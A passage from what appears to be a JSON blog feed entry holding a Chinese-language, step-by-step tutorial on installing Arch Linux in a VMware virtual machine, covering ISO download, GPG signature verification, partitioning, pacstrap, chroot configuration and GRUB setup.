<code>.torrent</code></li>\n<li>打开百度网盘，在其中上传该文件</li>\n<li>上传后双击该文件，点击开始下载到网盘，等待下载完成（有点慢哈！）</li>\n<li>下载到网盘后，将 <code>iso镜像文件</code> 下载到在自选的本地目录中<div class=\"note info\">\n<p>由于这种方式下载过慢，笔者建议使用方法二，即通过开源镜像站进行下载。</p>\n</div>\n</li>\n</ol>\n<h2 id=\"方法二\"><a class=\"markdownIt-Anchor\" href=\"#方法二\">#</a> 方法二</h2>\n<ol>\n<li>在<span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcmNobGludXgub3JnL2Rvd25sb2FkLw==\"> Download 界面</span>下翻，找到中国的镜像站列表:<br>\n<img data-src=\"mirrors.png\" alt=\"中国镜像站列表\"></li>\n<li>在其中选择 <code>tuna.tsinghua.edu.cn</code> ，即清华大学镜像站（我每次都用他们的镜像，速度不错）<br>\n<img data-src=\"tsinghua_mirror.png\" alt=\"清华大学镜像站\"></li>\n<li>选择 <code>archlinux-2023.09.01-x86_64.iso</code>  下载</li>\n<li>将 <code>.iso</code>  文件保存到我们想要虚拟机保存的目录中</li>\n</ol>\n<h1 id=\"获取gnupg签名\"><a class=\"markdownIt-Anchor\" href=\"#获取gnupg签名\">#</a> 获取<span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLmFyY2hsaW51eGNuLm9yZy93aWtpL0dudVBH\"> GnuPG</span> 签名</h1>\n<blockquote>\n<p>GnuPG 是什么？<br>\nGnuPG 是完整实现了 RFC4880（即 PGP）所定义的 OpenPGP 标准的自由软件。GnuPG 可以加密和签名你的数据和通讯信息，包含一个通用的密钥管理系统以及用于各种公钥目录的访问模块。GnuPG，简称 GPG，是一个易于与其它程序整合的命令行工具，拥有很多前端程序和函数库。GnuPG 还支持 S/MIME 和 Secure Shell (ssh)。</p>\n</blockquote>\n<p>从上述清华大学镜像站，可获取 iso 版本对应的 PGP 签名 <code>archlinux-2023.09.01-x86_64.iso.sig`` ![清华大学镜像站](tsinghua_mirror.png) 在本次安装中，我使用的是</code>  Git Bash <code>，其中装有GPG，</code> cmd <code>和</code>  powershell` 中也装有 gpg，可选择一个终端进行后续操作。</p>\n<h1 id=\"验证签名\"><a class=\"markdownIt-Anchor\" href=\"#验证签名\">#</a> 验证签名</h1>\n<p>为避免因 HTTP 连接下载镜像时遭到拦截，获取到恶意镜像，我们需要利用 PGP 签名对镜像进行验证。<br>\n通过以下命令验证:</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gpg --keyserver-options auto-key-retrieve <span class=\"token parameter variable\">--verify</span> archlinux-version-x86_64.iso.sig</pre></td></tr></table></figure><p>其中 <code>version</code>  替换成你所下载的版本号，如 <code>2023.09.01</code> 。我的显示结果是：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>legion@DESKTOP-ROOSFVQ MINGW64 /e/VMs/Arch</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$ gpg --keyserver-options auto-key-retrieve <span class=\"token parameter variable\">--verify</span> archlinux-2023.09.01-x86_64.iso.sig</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>gpg: assuming signed data <span class=\"token keyword\">in</span> <span class=\"token string\">'archlinux-2023.09.01-x86_64.iso'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>gpg: Signature made <span class=\"token number\">2023</span>年09月 <span class=\"token number\">1</span>日 <span class=\"token number\">18</span>:48:49</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>gpg:                using EDDSA key 3E80CA1A8B89F69CBA57D98A76A5EF9054449A5C</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>gpg:                issuer <span class=\"token string\">\"pierre@archlinux.org\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>gpg: Good signature from <span class=\"token string\">\"Pierre Schmitz &lt;pierre@archlinux.org>\"</span> <span class=\"token punctuation\">[</span>unknown<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>gpg: WARNING: This key is not certified with a trusted signature<span class=\"token operator\">!</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>gpg:          There is no indication that the signature belongs to the owner.</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Primary key fingerprint: 3E80 CA1A 8B89 F69C BA57  D98A 76A5 EF90 <span class=\"token number\">5444</span> 9A5C</pre></td></tr></table></figure><p>若从镜像站下载，则会显示 <code>fingerprint</code> ，我们需要打开<span class=\"exturl\" data-url=\"aHR0cHM6Ly9rZXlzZXJ2ZXIudWJ1bnR1LmNvbS9wa3MvbG9va3VwP29wPXZpbmRleCZhbXA7ZmluZ2VycHJpbnQ9b24mYW1wO2V4YWN0PW9uJmFtcDtzZWFyY2g9MHgzRTgwQ0ExQThCODlGNjlDQkE1N0Q5OEE3NkE1RUY5MDU0NDQ5QTVD\"> fingerprint 合集</span>，确保我们所获得的镜像的 <code>fingerprint</code>  和该网站上的 fingerprint 吻合。（确保公钥的指纹等于其中一位签署了 ISO 文件 Arch Linux 开发者的指纹）</p>\n<h1 id=\"准备安装介质\"><a class=\"markdownIt-Anchor\" href=\"#准备安装介质\">#</a> 准备安装介质</h1>\n<p>安装镜像包括：U 盘，光盘，和带有 PXE 的网络安装镜像。此处我是用 VMWare 虚拟机进行安装。</p>\n<h1 id=\"vmware-新建虚拟机\"><a class=\"markdownIt-Anchor\" href=\"#vmware-新建虚拟机\">#</a> VMWare 新建虚拟机</h1>\n<p>依次选择：</p>\n<ol>\n<li>自定义（高级）</li>\n<li>硬件兼容性</li>\n<li>稍后安装操作系统</li>\n<li>本内核版本为 6.4.12，因 VMware 中没有 Arch，因此我选择 <code>其他 Linux 5.x 内核 64位</code></li>\n<li>选择安装目录（自定）</li>\n<li>处理器配置、<s>内存大小分配</s>均选择默认（注意：内存大小选择 2G，768MB 完全不够)</li>\n<li>使用网络地址转换（NAT）</li>\n<li>SCSI 控制器：LSI Logic（L）</li>\n<li>虚拟磁盘类型：SCSI（S）</li>\n<li>创建新虚拟磁盘</li>\n<li>最大磁盘大小默认，将虚拟磁盘拆分成多个文件</li>\n<li>磁盘文件名默认</li>\n<li>自定义硬件 -&gt; 新 CD/DVD-&gt; 使用 ISO 映像文件 -&gt; 选择我们下载的 iso 文件 -&gt; 关闭</li>\n<li>完成</li>\n<li>你可以自行决定 BIOS 或 UEFI 模式启动（我选择 UEFI，但是应该影响不大）</li>\n<li>点击开启此虚拟机<div class=\"note info\">\n<p>Ready for the journey? Let’s go!</p>\n</div>\n</li>\n</ol>\n<h1 id=\"进入安装程序\"><a class=\"markdownIt-Anchor\" href=\"#进入安装程序\">#</a> 进入安装程序</h1>\n<ol>\n<li>默认第一项，等待一会儿，随后进入命令行模式</li>\n</ol>\n<h1 id=\"一号坑vmware-默认分配内存-768mb-过小需要-2g\"><a class=\"markdownIt-Anchor\" href=\"#一号坑vmware-默认分配内存-768mb-过小需要-2g\">#</a> 一号坑：VMware 默认分配内存 768MB 过小，需要 2G</h1>\n<p>开局遇雷：怎么回事？<br>\n<img data-src=\"command.png\" alt=\"命令行模式开启\"></p>\n<div class=\"note info\">\n<p>参考了<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2NDk5MDgwL2FydGljbGUvZGV0YWlscy8xMzE3MTE1MDMjOn46dGV4dD0yJUUzJTgwJTgxJUU2JTlCJUI0JUU2JTk2JUIwJUU5JTk1JTlDJUU1JTgzJThGJUU2JUJBJTkwcGFjbWFuLC1TeXkzJUUzJTgwJTgxJUU2JTlCJUI0JUU2JTk2JUIwUk9PVCVFNSVBRiU4NiVFNyVBMCU4MXBhc3N3ZDQlRTMlODAlODE=\">这篇博文</span>虚拟机默认的是 768MB，不够。在设置中修改为 2G, 成功启动。</p>\n</div>\n<h1 id=\"二号坑网络出现问题\"><a class=\"markdownIt-Anchor\" href=\"#二号坑网络出现问题\">#</a> 二号坑：网络出现问题</h1>\n<p><img data-src=\"network_error.png\" alt=\"Arch网络出问题\"></p>\n<div class=\"note info\">\n<p>关了虚拟机，重新开机，成功启动<br>\n<img data-src=\"success.png\" alt=\"Arch成功启动\"></p>\n</div>\n<h1 id=\"配置控制台键盘布局和字体\"><a class=\"markdownIt-Anchor\" href=\"#配置控制台键盘布局和字体\">#</a> 配置控制台键盘布局和字体</h1>\n<p>系统启动后，控制台键盘布局默认为 us（美式键盘）。如果您需要列出所有可用的键盘布局，可以使用以下命令：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span> /usr/share/kbd/keymaps/**/*.map.gz</pre></td></tr></table></figure><p><img data-src=\"keymaps.png\" alt=\"显示所有键盘布局\"><br>\n此处我使用 <code>us</code>  键盘布局，不修改。</p>\n<h1 id=\"检查是否连接到互联网\"><a class=\"markdownIt-Anchor\" href=\"#检查是否连接到互联网\">#</a> 检查是否连接到互联网</h1>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ip</span> <span class=\"token function\">link</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">ping</span> archlinux.org</pre></td></tr></table></figure><p><img data-src=\"network.png\" alt=\"检查网络连接\"></p>\n<h1 id=\"更新系统时间\"><a class=\"markdownIt-Anchor\" href=\"#更新系统时间\">#</a> 更新系统时间</h1>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>timedatectl <span class=\"token comment\">#查看系统时间</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>timedatectl list-timezones <span class=\"token comment\">#查看所有时区</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>timedatectl set-timezone <span class=\"token string\">\"Asia/Shanghai\"</span> <span class=\"token comment\"># 设置为亚洲上海</span></pre></td></tr></table></figure><p><img data-src=\"set-timezone.png\" alt=\"设置时区\"></p>\n<div class=\"note info\">\n<p>要创建磁盘分区了，为保证出问题后还能倒回来，此处拍摄快照 1</p>\n</div>\n<h1 id=\"创建硬盘分区\"><a class=\"markdownIt-Anchor\" href=\"#创建硬盘分区\">#</a> 创建硬盘分区</h1>\n<h2 id=\"指南\"><a class=\"markdownIt-Anchor\" href=\"#指南\">#</a> 指南</h2>\n<p>系统如果识别到计算机的内置硬盘、U 盘或者移动硬盘等类型磁盘，就会将其分配为一个块设备，如 /dev/sda、/dev/nvme0n1 或 /dev/mmcblk0。可以使用 lsblk 或者 fdisk 查看：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fdisk</span> -l<span class=\"token punctuation\">(</span>此处为小写字母l<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"block.png\" alt=\"块设备\"><br>\n结果中以 rom、loop 或者 airoot 结尾的设备可以被忽略。</p>\n<div class=\"note info\">\n<p>提示：在分区之前，请您检查 NVMe 驱动器和 Advanced Format 硬盘是否使用了最佳逻辑扇区大小。需要注意的是，更改逻辑扇区大小后，可能会导致在 Windows 系统中出现兼容性问题。<br>\n对于一个选定的设备，以下分区是必须要有的：</p>\n<ol>\n<li>一个根分区（挂载在 根目录）/；</li>\n<li>要在 UEFI 模式中启动，还需要一个 EFI 系统分区。</li>\n<li>如果您需要创建多级存储例如 LVM、磁盘加密 或 RAID，请您在这时候完成。<br>\n请使用分区工具（fdisk 、parted、cfdisk 等等）修改分区表。例如：</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fdisk</span> /dev/the_disk_to_be_partitioned（要被分区的磁盘）</pre></td></tr></table></figure><p>注意：<br>\n如果您想要的磁盘没有显示出来， 确保您的磁盘控制器未处于 RAID 模式。<br>\n如果要启动的磁盘已经有一个 EFI 系统分区，就不要再新建 EFI 分区了，而是使用现有的 EFI 分区。<br>\n如果文件系统支持，交换空间 可以通过 交换文件 实现。</p>\n</div>\n<h2 id=\"分区方案\"><a class=\"markdownIt-Anchor\" href=\"#分区方案\">#</a> 分区方案：</h2>\n<p><img data-src=\"partition.png\" alt=\"分区方案\"></p>\n<h2 id=\"分区步骤\"><a class=\"markdownIt-Anchor\" href=\"#分区步骤\">#</a> 分区步骤</h2>\n<h3 id=\"创建-gpt-分区表\"><a class=\"markdownIt-Anchor\" href=\"#创建-gpt-分区表\">#</a> 创建 GPT 分区表</h3>\n<ol>\n<li>输入 <code>fdisk /dev/sda</code> ，对 <code>/dev/sda</code>  磁盘进行分区</li>\n<li>输入 <code>g</code> ，创建一个 <code>GUID</code>  分区表</li>\n</ol>\n<h3 id=\"创建第一个分区efi-分区\"><a class=\"markdownIt-Anchor\" href=\"#创建第一个分区efi-分区\">#</a> 创建第一个分区：EFI 分区</h3>\n<ol>\n<li>输入 <code>n</code> ，创建第一个分区，输入其编号（默认为 1，即 <code>/dev/sda1</code> ）</li>\n<li>回车，默认其大小</li>\n<li>对最后一个扇区，输入 <code>+512M</code></li>\n<li>输入 <code>t</code>  来将这个新分区改为 &quot;EFI System&quot;</li>\n<li>输入 <code>L</code>  来查看所有分区名，输入 <code>q</code>  退出，可见 <code>EFI System</code>  分区别名为 1</li>\n<li>输入 <code>1</code> ，将分区改为 <code>EFI System</code></li>\n</ol>\n<h3 id=\"创建第二个分区文件系统分区\"><a class=\"markdownIt-Anchor\" href=\"#创建第二个分区文件系统分区\">#</a> 创建第二个分区：文件系统分区</h3>\n<ol>\n<li>输入 <code>n</code> ，创建第二个分区</li>\n<li>两次回车，使用默认分区号和扇区大小</li>\n<li>输入 <code>-512M</code> ，为交换分区留出 512MB 大小来</li>\n<li>分区默认名为 <code>Linux filesystem</code> ，因此不需要改</li>\n</ol>\n<h3 id=\"创建第三个分区交换分区\"><a class=\"markdownIt-Anchor\" href=\"#创建第三个分区交换分区\">#</a> 创建第三个分区：交换分区</h3>\n<ol>\n<li>输入 <code>n</code> ，创建第三个分区</li>\n<li>连按 3 次回车，接受所有默认设置</li>\n<li>输入 <code>t</code> ，将新分区改为 <code>Linux Swap</code> , 别名为 19</li>\n</ol>\n<h3 id=\"查看分区结果\"><a class=\"markdownIt-Anchor\" href=\"#查看分区结果\">#</a> 查看分区结果</h3>\n<p>输入 <code>p</code></p>\n<h3 id=\"完成修改\"><a class=\"markdownIt-Anchor\" href=\"#完成修改\">#</a> 完成修改</h3>\n<p>输入 <code>w</code></p>\n<h1 id=\"格式化分区\"><a class=\"markdownIt-Anchor\" href=\"#格式化分区\">#</a> 格式化分区</h1>\n<p>对于不同的分区，我们使用不同的文件系统：</p>\n<h2 id=\"esp-分区格式化mkfsfat格式化-fat32-文件系统\"><a class=\"markdownIt-Anchor\" href=\"#esp-分区格式化mkfsfat格式化-fat32-文件系统\">#</a> ESP 分区格式化： <code>mkfs.fat</code>  格式化 FAT32 文件系统</h2>\n<p>ESP 在 <code>/dev/sda1</code>  中，运行 <code>mkfs.fat -F32 /dev/sda1</code>  来挂载 FAT32 文件系统</p>\n<h2 id=\"根分区通过mkfsext4格式化-ext4-文件系统\"><a class=\"markdownIt-Anchor\" href=\"#根分区通过mkfsext4格式化-ext4-文件系统\">#</a> 根分区：通过 <code>mkfs.ext4</code>  格式化 ext4 文件系统</h2>\n<p><code>mkfs.ext4 /dev/sad2</code></p>\n<h2 id=\"交换分区格式化mkswap\"><a class=\"markdownIt-Anchor\" href=\"#交换分区格式化mkswap\">#</a> 交换分区格式化： <code>mkswap</code></h2>\n<p><code>mkswap /dev/sda3</code></p>\n<h1 id=\"挂载分区\"><a class=\"markdownIt-Anchor\" href=\"#挂载分区\">#</a> 挂载分区</h1>\n<h2 id=\"挂载根分区\"><a class=\"markdownIt-Anchor\" href=\"#挂载根分区\">#</a> 挂载根分区</h2>\n<p>将根磁盘卷挂载到 <code>/mnt</code> ，使用命令： <code>mount /dev/sda2 /mnt</code></p>\n<h2 id=\"挂载-efi-分区\"><a class=\"markdownIt-Anchor\" href=\"#挂载-efi-分区\">#</a> 挂载 EFI 分区</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mount</span> <span class=\"token parameter variable\">--mkdir</span> /dev/sda1 /mnt/boot</pre></td></tr></table></figure><h2 id=\"挂载-swap-分区\"><a class=\"markdownIt-Anchor\" href=\"#挂载-swap-分区\">#</a> 挂载 swap 分区</h2>\n<p><code>swapon /dev/sda3</code>  来启用交换分区</p>\n<p>稍后 genfstab (8) 将自动检测挂载的文件系统和交换空间。</p>\n<h1 id=\"开始安装系统\"><a class=\"markdownIt-Anchor\" href=\"#开始安装系统\">#</a> 开始安装系统</h1>\n<h2 id=\"选择镜像站\"><a class=\"markdownIt-Anchor\" href=\"#选择镜像站\">#</a> 选择镜像站</h2>\n<h3 id=\"安装reflector包\"><a class=\"markdownIt-Anchor\" href=\"#安装reflector包\">#</a> 安装 <code>reflector</code>  包</h3>\n<p>通常来说系统默认有，如果没有的话使用如下命令安装：<br>\n <code>sudo pacman -S reflector</code></p>\n<h3 id=\"更新源\"><a class=\"markdownIt-Anchor\" href=\"#更新源\">#</a> 更新源</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> reflector <span class=\"token parameter variable\">--country</span> China <span class=\"token parameter variable\">--save</span> /etc/pacman.d/mirrorlist.pacnew</pre></td></tr></table></figure><p>确保源准确无误后，将 <code>mirrorlist.pacnew</code>  复制到 <code>mirrorlist</code></p>\n<h2 id=\"安装必须的软件包\"><a class=\"markdownIt-Anchor\" href=\"#安装必须的软件包\">#</a> 安装必须的软件包</h2>\n<p>使用 pacstrap (8) 脚本，安装 base 包 软件包和 Linux 内核以及常规硬件的固件：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pacstrap <span class=\"token parameter variable\">-K</span> /mnt base linux <span class=\"token function\">vim</span> man-db man-pages texinfo</pre></td></tr></table></figure><p>这时候可以同时额外安装计算机的 CPU 微码包。如果计算机是 Intel 的 CPU ，使用 <code>intel-ucode</code>  包，AMD CPU 则使用  <code>amd-ucode</code>  包。也可以暂时都不安装，等到进入系统后再安装。</p>\n<div class=\"note info\">\n<ol>\n<li>因为我是在虚拟机中安装，因此我不安装固件 <code>linux-firmware</code>  和微码包 <code>intel-ucode</code> 。如果你有想补充的软件，请加在 <code>pacstrap</code>  后面。</li>\n<li>是 <code>texinfo</code> ，不是 <code>textinfo</code> ，不要看错啦！</li>\n</ol>\n</div>\n<!-- ~~# 三号坑：出现`error: failed to install packages to new root`~~\n解决方案：\n3. `pacman -S archlinux-keyring`\n4. `pacman-key --refresh-keys`\n   -->\n<h1 id=\"配置系统\"><a class=\"markdownIt-Anchor\" href=\"#配置系统\">#</a> 配置系统</h1>\n<h2 id=\"生成-fstab-文件\"><a class=\"markdownIt-Anchor\" href=\"#生成-fstab-文件\">#</a> 生成 fstab 文件</h2>\n<p>通过以下命令生成 fstab 文件 (用 -U 或 -L 选项设置 UUID 或卷标)：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>genfstab <span class=\"token parameter variable\">-U</span> /mnt <span class=\"token operator\">>></span> /mnt/etc/fstab</pre></td></tr></table></figure><p>强烈建议在执行完以上命令后，检查一下生成的 <code>/mnt/etc/fstab</code>  文件是否正确。</p>\n<h2 id=\"chroot-到新安装的系统\"><a class=\"markdownIt-Anchor\" href=\"#chroot-到新安装的系统\">#</a> chroot 到新安装的系统</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>arch-chroot /mnt</pre></td></tr></table></figure><div class=\"note info\">\n<p>提示：此处使用的是 arch-chroot 而不是直接使用 chroot，注意不要输错了。在 <code>arch-chroot</code>  进入 <code>/mnt</code>  后，提示符应该变为了 <code>[root@archiso]</code>  样式，如果没有，请检查一下前面的步骤是否都准确完成了。</p>\n</div>\n<h2 id=\"设置时区\"><a class=\"markdownIt-Anchor\" href=\"#设置时区\">#</a> 设置时区</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ln</span> <span class=\"token parameter variable\">-sf</span> /usr/share/zoneinfo/Region（地区名）/City（城市名） /etc/localtime</pre></td></tr></table></figure><p>地区名填 Asia, 城市名填 Shanghai<br>\n 然后运行 hwclock (8) 以生成 /etc/adjtime：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>hwclock <span class=\"token parameter variable\">--systohc</span></pre></td></tr></table></figure><p>这个命令假定已设置硬件时间为 UTC 时间。</p>\n<h2 id=\"区域和本地化设置\"><a class=\"markdownIt-Anchor\" href=\"#区域和本地化设置\">#</a> 区域和本地化设置</h2>\n<ol>\n<li>编辑 <code>/etc/locale.gen</code> 。将 <code>en_US.UTF-8</code>  或其他你想要的配置，对应那行取消注释。修改后，执行 <code>locale-gen</code> ，以生成 <code>locale信息</code> 。</li>\n<li>创建 <code>/etc/locale.conf</code> ，在其中写入：</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token assign-left variable\"><span class=\"token environment constant\">LANG</span></span><span class=\"token operator\">=</span>en_US.UTF-8</pre></td></tr></table></figure><h2 id=\"控制台键盘布局和字体设置\"><a class=\"markdownIt-Anchor\" href=\"#控制台键盘布局和字体设置\">#</a> 控制台键盘布局和字体设置</h2>\n<p>如果需要修改控制台键盘布局和字体，可编辑 /etc/vconsole.conf 使其长期生效，例如：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token assign-left variable\">KEYMAP</span><span class=\"token operator\">=</span>de-latin1</pre></td></tr></table></figure><h2 id=\"网络配置\"><a class=\"markdownIt-Anchor\" href=\"#网络配置\">#</a> 网络配置</h2>\n<div class=\"note info\">\n<p>网络配置很重要，否则安装系统后会连不上网（例如 <code>VirtualBox</code>  桥接模式就需要配置 DHCP）</p>\n</div>\n<h3 id=\"设置主机名\"><a class=\"markdownIt-Anchor\" href=\"#设置主机名\">#</a> 设置主机名</h3>\n<p>创建 <code>/etc/hostname</code>  文件，在其中直接填写你所设定的主机名，我填写的主机名是 <code>arch</code></p>\n<h3 id=\"检查连接\"><a class=\"markdownIt-Anchor\" href=\"#检查连接\">#</a> 检查连接</h3>\n<p>TODO</p>\n<h3 id=\"安装网络管理器\"><a class=\"markdownIt-Anchor\" href=\"#安装网络管理器\">#</a> 安装网络管理器</h3>\n<ol>\n<li><code>pacman -S networkmanager</code></li>\n<li><code>systemctl enable NetworkManager.service</code>  设置网络管理器开机自启动</li>\n</ol>\n<h2 id=\"关于-initramfs\"><a class=\"markdownIt-Anchor\" href=\"#关于-initramfs\">#</a> 关于 initramfs</h2>\n<p>通常不需要自己创建新的 initramfs，因为在执行 pacstrap 时已经安装 linux 包，这时已经运行过 mkinitcpio 了。</p>\n<h2 id=\"设置-root-密码\"><a class=\"markdownIt-Anchor\" href=\"#设置-root-密码\">#</a> 设置 root 密码</h2>\n<p>输入 <code>passwd</code>  创建一个 <code>root</code>  密码</p>\n<h2 id=\"安装引导程序\"><a class=\"markdownIt-Anchor\" href=\"#安装引导程序\">#</a> 安装引导程序</h2>\n<p>需要安装 Linux 引导加载程序，才能在安装后启动系统，可以使用的的引导程序已在启动加载器中列出，请选择一个安装并配置它，GRUB 是最常见的选择。<br>\n如果有 Intel 或 AMD 的 CPU，请另外启用微码更新。</p>\n<ol>\n<li>安装 <code>grub</code>  和 <code>efibootmgr</code> ：输入 <code>pacman -S grub efibootmgr</code></li>\n<li>输入 <code>grub-install --target=x86_64-efi --efi-directory=[esp] --bootloader-id=GRUB</code><div class=\"note info\">\n<p>我的 <code>esp</code>  挂载点是 <code>/mnt/boot</code> ，因为我已经 <code>arch-chroot</code>  到 <code>/mnt</code>  中了，因此 <code>esp</code>  字段填写 <code>/boot</code>  即可。如果你安装在了其他挂载点上，请在 <code>esp</code>  字段填写你自己的挂载点。如果出现问题，检查：</p>\n</div>\n</li>\n</ol>\n<ul>\n<li>是否已经 <code>arch-chroot</code>  到了 <code>/mnt</code>  下？命令提示符为 <code>[root@archiso]</code></li>\n<li>前面的配置过程有没有出现问题？<br>\n:::<br>\n <code>grub-install</code>  命令成功时应该出现:<br>\n<img data-src=\"grub-install.png\" alt=\"grub-install成功\"></li>\n</ul>\n<ol start=\"3\">\n<li>生成主配置文件: <code>grub-mkconfig -o /boot/grub/grub.cfg</code> <br>\n 配置成功时界面：<br>\n<img data-src=\"configure.png\" alt=\"配置成功\"></li>\n</ol>\n<h1 id=\"重新启动计算机\"><a class=\"markdownIt-Anchor\" href=\"#重新启动计算机\">#</a> 重新启动计算机</h1>\n<ol>\n<li><code>exit</code>  退出 <code>chroot</code>  环境</li>\n<li><code>umount -R /mnt</code>  取消挂载 <code>/mnt</code> （也等到可 <code>reboot</code>  时 systemd 自动卸载）</li>\n<li><code>reboot</code>  重启系统</li>\n</ol>\n<h1 id=\"安装后的工作\"><a class=\"markdownIt-Anchor\" href=\"#安装后的工作\">#</a> 安装后的工作</h1>\n<p>参见<span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLmFyY2hsaW51eGNuLm9yZy93aWtpLyVFNSVCQiVCQSVFOCVBRSVBRSVFOSU5OCU4NSVFOCVBRiVCQg==\">建议阅读列表</span>及<span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLmFyY2hsaW51eGNuLm9yZy93aWtpLyVFNSVCQSU5NCVFNyU5NCVBOCVFNyVBOCU4QiVFNSVCQSU4RiVFNSU4OCU5NyVFOCVBMSVBOA==\">应用程序列表</span></p>\n",
            "tags": [
                "Arch",
                "Linux",
                "操作系统",
                "notes",
                "安装教程"
            ]
        }
    ]
}